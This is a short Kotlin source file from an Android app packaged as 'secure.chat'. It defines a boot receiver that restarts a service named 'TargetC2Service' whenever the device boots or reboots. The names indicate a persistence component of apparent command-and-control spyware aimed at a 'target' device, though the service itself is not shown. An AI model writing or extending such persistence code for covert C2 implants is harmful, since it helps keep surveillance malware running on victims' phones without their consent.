package com.secure.chat.services

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.util.Log

class TargetBootReceiver : BroadcastReceiver() {

    companion object {
        private const val TAG = "TargetBoot"
    }

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Intent.ACTION_BOOT_COMPLETED || intent.action == Intent.ACTION_REBOOT) {
            Log.d(TAG, "Device booted — restarting C2 service")

            val serviceIntent = Intent(context, TargetC2Service::class.java).apply {
                action = "restart"
            }

            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent)
            } else {
                context.startService(serviceIntent)
            }
        }
    }
}